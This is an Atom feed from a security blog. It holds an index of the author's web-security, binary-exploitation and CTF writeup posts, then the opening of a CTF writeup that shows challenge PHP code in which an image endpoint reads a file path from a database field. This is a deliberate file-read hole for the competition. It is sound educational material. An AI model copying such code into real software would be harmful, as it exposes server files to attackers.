<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chybeta</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-08-31T11:41:01.963Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>chybeta</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一些文章</title>
    <link href="http://yoursite.com/3017/07/26/%E4%B8%80%E4%BA%9B%E6%96%87%E7%AB%A0/"/>
    <id>http://yoursite.com/3017/07/26/一些文章/</id>
    <published>3017-07-26T11:27:04.000Z</published>
    <updated>2017-08-31T11:41:01.963Z</updated>
    
    <content type="html"><![CDATA[<p>一些自己写的文章。<br><a id="more"></a></p>
<h1 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h1><ul>
<li><a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="external">Web-Security-Learning</a></li>
<li><a href="https://github.com/CHYbeta/Software-Security-Learning" target="_blank" rel="external">Software-Security-Learning</a></li>
<li><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc:CMS渗透测试框架 </a></li>
<li><a href="https://chybeta.gitbooks.io/the-path-to-machine-learning/content/" target="_blank" rel="external">The Path to Machine Learning</a></li>
<li><a href="https://book.ph0en1x.com/" target="_blank" rel="external">Awesome CTF Book</a></li>
<li><a href="https://chybeta.gitbooks.io/vuln-time/content/" target="_blank" rel="external">Vuln-Time</a></li>
</ul>
<h1 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul>
<li><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" target="_blank" rel="external">命令执行的一些绕过技巧</a></li>
<li><a href="https://chybeta.github.io/2017/07/26/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">php代码执行漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/" target="_blank" rel="external">MySql注入备忘录</a></li>
<li><a href="https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="external">php代码审计小总结 </a></li>
<li><a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" target="_blank" rel="external">小试XML实体注入攻击 </a></li>
<li><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">浅谈php反序列化漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/13/%E5%88%A9%E7%94%A8PHP%E7%9A%84OPcache%E6%9C%BA%E5%88%B6getshell/" target="_blank" rel="external">利用PHP的OPcache机制getshell</a></li>
</ul>
<h2 id="Vuln-Analysis"><a href="#Vuln-Analysis" class="headerlink" title="Vuln Analysis"></a>Vuln Analysis</h2><ul>
<li><a href="https://chybeta.github.io/2017/08/04/%C2%96PHPCMS-v9-6-0-wap%E6%A8%A1%E5%9D%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="external">PHPCMS v9.6.0 wap模块sql注入漏洞分析</a></li>
<li><a href="https://chybeta.github.io/2017/07/22/PHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="external">PHPCMS v9.6.0 任意文件上传漏洞分析 </a></li>
<li><a href="https://chybeta.github.io/2017/07/11/Catfish-%E9%B2%B6%E9%B1%BC-CMS-V-4-4-10-%E7%95%99%E8%A8%80%E6%9D%BF%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection%E5%88%86%E6%9E%90/" target="_blank" rel="external">[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection%E5%88%86%E6%9E%90/" target="_blank" rel="external">[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/03/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9ABlueCMSv1-6-sp1/" target="_blank" rel="external">代码审计之SQL注入：BlueCMSv1.6 sp1 </a></li>
</ul>
<h1 id="Bin-Security"><a href="#Bin-Security" class="headerlink" title="Bin Security"></a>Bin Security</h1><ul>
<li><a href="https://chybeta.github.io/2017/08/14/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/" target="_blank" rel="external">逆向学习笔记（一）</a></li>
<li><a href="https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/#more" target="_blank" rel="external">ROP学习：利用通用gadget </a></li>
<li><a href="https://chybeta.github.io/2017/06/26/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/" target="_blank" rel="external">ROP学习：64位栈溢出</a></li>
</ul>
<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><ul>
<li><a href="https://chybeta.github.io/2017/07/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9A%E6%9C%80%E8%BF%91%E9%82%BB-KNN/" target="_blank" rel="external">机器学习算法：最近邻(KNN)</a></li>
<li><a href="https://chybeta.github.io/2017/07/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95-%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron/" target="_blank" rel="external">机器学习算法：感知机(perceptron) </a></li>
<li><a href="https://chybeta.github.io/2017/07/06/Tensorflow%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%B8%B8%E7%94%A8API/" target="_blank" rel="external">Tensorflow学习：常用API</a></li>
<li><a href="https://chybeta.github.io/2017/03/15/win%E4%B8%8Btensorflow%E5%AE%89%E8%A3%85%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97-0/" target="_blank" rel="external">win下tensorflow安装避坑指南</a></li>
</ul>
<h1 id="数据挖掘"><a href="#数据挖掘" class="headerlink" title="数据挖掘"></a>数据挖掘</h1><ul>
<li><a href="https://chybeta.github.io/2017/01/22/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%880%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8Banaconda%E5%AE%89%E8%A3%85/" target="_blank" rel="external">数据挖掘比赛（0）环境搭建之anaconda安装</a></li>
<li><a href="https://chybeta.github.io/2017/01/24/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%881%EF%BC%89%E5%AF%B9%E6%97%A0%E5%88%97%E5%90%8D%E7%9A%84txt%E6%95%B0%E6%8D%AE%E9%9B%86%E8%AF%BB%E5%8F%96%E6%96%B9%E6%B3%95%E5%8F%8A%E5%A4%84%E7%90%86/" target="_blank" rel="external">数据挖掘比赛（1）对无列名的txt数据集读取方法及处理</a></li>
<li><a href="https://chybeta.github.io/2017/01/25/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%8F%96%E5%A4%A7%E5%9E%8B%E6%95%B0%E6%8D%AE%E9%9B%86/" target="_blank" rel="external">数据挖掘比赛（2）利用pandas读取大型数据集</a></li>
<li><a href="https://chybeta.github.io/2017/01/29/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%883%EF%BC%89%E7%94%B3%E8%AF%B7anaconda-academic-license%E5%B9%B6%E4%BD%BF%E7%94%A8/" target="_blank" rel="external">数据挖掘比赛（3）申请anaconda-academic-license并使用</a></li>
<li><a href="https://chybeta.github.io/2017/02/01/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%884%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8A/" target="_blank" rel="external">数据挖掘比赛（4）ten Minutes to pandas中文版上 </a></li>
<li><a href="https://chybeta.github.io/2017/02/02/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%885%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8B/" target="_blank" rel="external">数据挖掘比赛（5）ten Minutes to pandas中文版下</a></li>
</ul>
<h1 id="技术杂谈"><a href="#技术杂谈" class="headerlink" title="技术杂谈"></a>技术杂谈</h1><ul>
<li><a href="https://chybeta.github.io/2017/02/14/win%E4%B8%8BDocker%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E4%BF%AE%E6%94%B9/" target="_blank" rel="external">win下Docker默认存储位置修改</a></li>
<li><a href="https://chybeta.github.io/2017/02/13/windows%E5%B9%B3%E5%8F%B0%E4%B8%8BDocker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="external">windows平台下Docker环境搭建</a></li>
</ul>
<h1 id="编程练习"><a href="#编程练习" class="headerlink" title="编程练习"></a>编程练习</h1><ul>
<li><a href="https://chybeta.github.io/3017/06/19/ACM-OJ-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/" target="_blank" rel="external">ACM-OJ[长期更新]</a></li>
<li><a href="https://chybeta.github.io/2017/08/12/hihoCoder-162%E5%91%A8%EF%BC%9A%E5%9B%9E%E6%96%87%E5%AD%97%E7%AC%A6%E4%B8%B2/" target="_blank" rel="external">hihoCoder 162周：回文字符串 </a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-3-%E6%95%B0%E7%BB%84%E5%8D%95%E8%B0%83%E5%92%8C/" target="_blank" rel="external">CodeTrain(3)数组单调和</a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-2-%E6%A3%8B%E5%AD%90%E7%BF%BB%E8%BD%AC/" target="_blank" rel="external">CodeTrain(2)棋子翻转</a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-1-%E6%9C%80%E5%A4%A7%E5%B7%AE%E5%80%BC/" target="_blank" rel="external">CodeTrain(1)最大差值</a></li>
</ul>
<h1 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h1><ul>
<li><a href="https://chybeta.github.io/2017/02/17/%E8%AE%B02017%E5%B9%B4%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E4%B9%8B%E8%A1%8C/" target="_blank" rel="external"> 记2017年阿里巴巴之行
</a></li>
</ul>
<h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/31/ISG2017-wmwcms-writeup/" target="_blank" rel="external">ISG2017-wmwcms-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/" target="_blank" rel="external">HITB CTF 2017-Pasty-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-H4ck3rM1nd-writeup/" target="_blank" rel="external">Hackit2017-H4ck3rM1nd-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-Weekands-of-hacker-writeup/" target="_blank" rel="external">Hackit2017-Weekands of hacker-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-V1rus3pidem1c-writeup/" target="_blank" rel="external">Hackit2017-V1rus3pidem1c-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-B3tterS0ci4lN3twork-writeup/" target="_blank" rel="external">Hackit2017-B3tterS0ci4lN3twork-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/27/HackCon2017-Web-writeup/" target="_blank" rel="external">HackCon2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/26/XNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup/" target="_blank" rel="external">XNUCA2017-第一期：Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-XSS-writeup/" target="_blank" rel="external">XMAN夏令营-2017-XSS-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-%E6%AF%94%E8%B5%9B%E7%B3%BB%E7%BB%9F-writeup/" target="_blank" rel="external">XMAN夏令营-2017-比赛系统-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/" target="_blank" rel="external">XMAN夏令营-2017-babyweb-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-default-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-default-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%98%B3%E5%85%89%E6%80%BB%E5%9C%A8%E9%A3%8E%E9%9B%A8%E5%90%8E-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-阳光总在风雨后-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-Document-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-Document-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/17/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E6%9C%80%E5%AE%89%E5%85%A8%E7%9A%84%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-最安全的笔记管理系统-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-vote-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-vote-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-php%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-php是最好的语言-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%83%A8%E5%88%86%E7%AE%80%E5%8D%95%E9%A2%98%E6%B1%87%E6%80%BB-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-部分简单题汇总-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/" target="_blank" rel="external">SHACTF-2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-web-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/" target="_blank" rel="external">实验吧-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/19/CTFZone-2017-Leaked-messages-writeup/" target="_blank" rel="external">CTFZone-2017-Leaked messages-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/" target="_blank" rel="external">XMAN选拔赛-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/16/Meenpwn-2017-web-writeup/" target="_blank" rel="external">Meenpwn-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/" target="_blank" rel="external">一道好玩的webshell题 </a></li>
<li><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/" target="_blank" rel="external">jarvisoj-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-js-writeup/" target="_blank" rel="external">ringzer0team-js-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-web-writeup/" target="_blank" rel="external">ringzer0team-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/25/xss-quiz-writeup/" target="_blank" rel="external">xss-quiz-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/19/GCTF-web-writeup/" target="_blank" rel="external">GCTF-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/" target="_blank" rel="external">“春秋杯”web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/01/12/%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0web%E5%89%8D30%E9%A2%98%E8%A7%A3/" target="_blank" rel="external">南邮CTF平台web前30题解</a></li>
</ul>
<h3 id="sqli-lab"><a href="#sqli-lab" class="headerlink" title="sqli-lab"></a>sqli-lab</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less17-writeup/" target="_blank" rel="external">Sqli-Labs:Less17-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less15-16-writeup/" target="_blank" rel="external">Sqli-Labs:Less15~16-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less13-14-writeup/" target="_blank" rel="external">Sqli-Labs:Less13~14-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less11-12-writeup/" target="_blank" rel="external">Sqli-Labs:Less11~12-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less8-10-writeup/" target="_blank" rel="external">Sqli-Labs:Less8~10-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less7-writeup/" target="_blank" rel="external">Sqli-Labs:Less7-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less5-6-writeup/" target="_blank" rel="external">Sqli-Labs:Less5-6-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/04/02/Sqli-Labs-Less1-4-writeup/" target="_blank" rel="external">Sqli-Labs:Less1-4-writeup</a></li>
</ul>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="CTF-1"><a href="#CTF-1" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/12/Codegate-2017-Qual-babypwn-writeup/" target="_blank" rel="external">Codegate 2017 Qual-babypwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-pwn-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-pwn-writeup/" target="_blank" rel="external">XMAN选拔赛-2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/29/XMAN-pwn-writeup/" target="_blank" rel="external">XMAN-pwn-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/28/SUCTF-2016-pwn400-writeup/" target="_blank" rel="external">SUCTF-2016-pwn400-writeup</a></li>
</ul>
<h3 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-shellshock/" target="_blank" rel="external">Pwnable.kr:shellshock</a></li>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-mistake/" target="_blank" rel="external">Pwnable.kr:mistake</a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/" target="_blank" rel="external">Pwnable.kr:random </a></li>
<li><a href="https://chybeta.github.io/2017/04/08/Pwnable-kr-passcode/" target="_blank" rel="external">Pwnable.kr:passcode</a></li>
<li><a href="https://chybeta.github.io/2017/04/07/Pwnable-kr-bof/" target="_blank" rel="external">Pwnable.kr:bof</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="https://chybeta.github.io/2017/08/30/Hackit2017-Cypherpunk%E2%80%99s-nightmare-writeup/" target="_blank" rel="external">Hackit2017-Cypherpunk’s nightmare-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/30/Hackit2017-USB-ducker-writeup/" target="_blank" rel="external">Hackit2017-USB ducker-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/ISG2017-%E8%B5%9B%E5%89%8D%E7%BB%83%E6%89%8B%E9%A2%98%E2%80%94writeup/" target="_blank" rel="external">ISG2017-赛前练手题—writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/27/HackCon2017-Steg-writeup/" target="_blank" rel="external">HackCon2017-Steg-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Growing-Up-writeup/" target="_blank" rel="external">SHACTF-2017-Growing Up-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-WannaFly-writeup/" target="_blank" rel="external">SHACTF-2017-WannaFly-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-misc-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-misc-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/23/0ctf-2015-Peers-writeup/" target="_blank" rel="external">0ctf-2015-Peers-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/17/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-misc-writeup/" target="_blank" rel="external">XMAN选拔赛-2017-misc-writeup</a></li>
</ul>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><ul>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-crypto-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-crypto-writeup</a></li>
<li><a href="Meenpwn-2017-crypto-writeup">Meenpwn-2017-crypto-writeup</a></li>
</ul>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><ul>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-Reverse-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-Reverse-writeup</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一些自己写的文章。&lt;br&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://yoursite.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ISG2017-wmwcms-writeup</title>
    <link href="http://yoursite.com/2017/08/31/ISG2017-wmwcms-writeup/"/>
    <id>http://yoursite.com/2017/08/31/ISG2017-wmwcms-writeup/</id>
    <published>2017-08-31T08:29:51.000Z</published>
    <updated>2017-08-31T10:06:49.113Z</updated>
    
    <content type="html"><![CDATA[<p>ISG2017-wmwcms-writeup<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Can u conquer this crude cms and get flag?</div><div class="line">link: http://202.120.7.204:7242</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>查看robots.txt，可以发现有压缩包，下载下来后得到源码。</p>
<p>文件目录如下；<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170831/3.png?raw=true" alt=""></p>
<p>public/app.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    session_start();</div><div class="line">    define(<span class="string">'APP_PATH'</span>, dirname(dirname(<span class="keyword">__FILE__</span>)) . <span class="string">'/server/'</span>);</div><div class="line">    error_reporting(<span class="number">0</span>);</div><div class="line">    <span class="keyword">include_once</span> APP_PATH . <span class="string">'sql.php'</span>;</div><div class="line">    <span class="keyword">include_once</span> APP_PATH . <span class="string">'func.php'</span>;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">"action"</span>])) &#123;</div><div class="line">        errormsg(<span class="string">"action is required."</span>);</div><div class="line">    &#125;</div><div class="line">    $actions = [<span class="string">"login"</span>, <span class="string">"logout"</span>, <span class="string">"img"</span>];</div><div class="line">    <span class="keyword">if</span> (!in_array($_GET[<span class="string">"action"</span>], $actions)) &#123;</div><div class="line">        errormsg(<span class="string">'Hacking attempt'</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">include</span> APP_PATH . $_GET[<span class="string">"action"</span>] . <span class="string">".php"</span>;</div><div class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>server/img.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include_once</span> <span class="string">'sql.php'</span>;</div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'uid'</span>])) &#123;</div><div class="line">    $portrait = <span class="string">"img/user.png"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $uid = intval($_SESSION[<span class="string">'uid'</span>]);</div><div class="line">    $sql = <span class="string">"select portrait from user where id = ?"</span>;</div><div class="line">    $sth = $dbh-&gt;prepare($sql);</div><div class="line">    $sth-&gt;execute([$uid]);</div><div class="line">    $user = $sth-&gt;fetchAll();</div><div class="line">    <span class="keyword">if</span>(count($user) &gt; <span class="number">0</span>)&#123;</div><div class="line">        $user = $user[<span class="number">0</span>];</div><div class="line">        $portrait = $user[<span class="string">"portrait"</span>];</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $portrait = <span class="string">"img/user.png"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">header(<span class="string">"Cache-Control: max-age=1, s-maxage=1, no-cache, must-revalidate"</span>);</div><div class="line">header(<span class="string">"Content-type: image/png;charset=gb2312"</span>);</div><div class="line"><span class="keyword">echo</span> file_get_contents($portrait);</div></pre></td></tr></table></figure></p>
